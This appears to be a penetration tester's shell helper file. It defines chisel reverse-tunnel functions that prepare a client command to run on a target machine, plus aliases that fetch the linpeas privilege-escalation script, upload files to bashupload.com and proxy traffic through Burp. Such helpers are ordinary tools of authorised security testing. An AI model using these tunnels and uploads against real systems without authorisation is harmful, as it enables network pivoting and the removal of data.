# Chisel

chisel-socks() {
    need chisel-tunnel 
    if [ "$#" -ne 2 ];
    then
        echo "[i] Usage: chisel_socks <ip> <server_port>"
    else
        echo "[+] copied chisel client -v $1:$2 R:socks in clipboard"
        echo "./chisel client -v $1:$2 R:socks" | xclip -sel c
        chisel server -v -p $2 --reverse
    fi
}

chisel-forward() {
    need chisel-tunnel 
    if [ "$#" -ne 4 ]; then
        echo "[i] Usage: chisel_remote <local_ip> <local_port> <remote_ip> <remote_port>"
    else
        echo "./chisel client $1:8888 R:$2:$3:$4" | xclip -sel clip
        echo "[+] Copied to clipboard: ./chisel client $1:8888 R:$2:$3:$4"
        echo "[+] Run this on the target machine"
        chisel server -p 8888 --reverse
    fi
}

# Utils

alias linpeas="curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -s --output $HOME/.local/www/linpeas.sh"
alias upload='curl bashupload.com -T "${@}"'
alias burl='curl -x http://127.0.0.1:8080/ -k'
alias adb-proxy-set="adb shell settings put global http_proxy $(ip a | grep -A 2 "enp4s0:" | grep -oP '(?<=inet\s)\d+(\.\d+){3}'):8080"
alias adb-proxy-unset="adb shell settings put global http_proxy :0"
